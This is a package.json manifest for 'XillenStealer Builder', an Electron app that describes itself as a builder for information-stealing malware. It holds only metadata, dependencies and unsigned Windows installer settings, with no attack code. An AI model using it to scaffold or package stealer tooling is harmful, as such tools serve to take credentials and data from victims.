{
  "name": "xillen-stealer-builder",
  "version": "5.0.0",
  "description": "XillenStealer Builder V5.0 - Advanced Stealer Builder with Modern UI",
  "main": "main.js",
  "scripts": {
    "start": "electron .",
    "dev": "electron . --dev",
    "build": "electron-builder",
    "dist": "electron-builder --publish=never"
  },
  "keywords": [
    "stealer",
    "builder",
    "electron",
    "xillen"
  ],
  "author": "XillenKillers Team",
  "license": "MIT",
  "devDependencies": {
    "electron": "^27.0.0",
    "electron-builder": "^24.6.4",
    "webpack": "^5.88.0",
    "webpack-cli": "^5.1.4",
    "terser-webpack-plugin": "^5.3.9",
    "@babel/core": "^7.23.0",
    "@babel/preset-env": "^7.23.0",
    "@babel/plugin-proposal-class-properties": "^7.18.6",
    "@babel/plugin-transform-runtime": "^7.23.0",
    "babel-loader": "^9.1.3"
  },
  "build": {
    "appId": "com.xillenkillers.stealerbuilder",
    "productName": "XillenStealer Builder",
    "directories": {
      "output": "dist"
    },
    "files": [
      "**/*",
      "!node_modules",
      "!dist",
      "!*.md"
    ],
    "win": {
      "target": "nsis",
      "icon": "renderer/assets/icon.ico",
      "sign": false
    },
    "nsis": {
      "oneClick": false,
      "allowToChangeInstallationDirectory": true
    }
  }
}
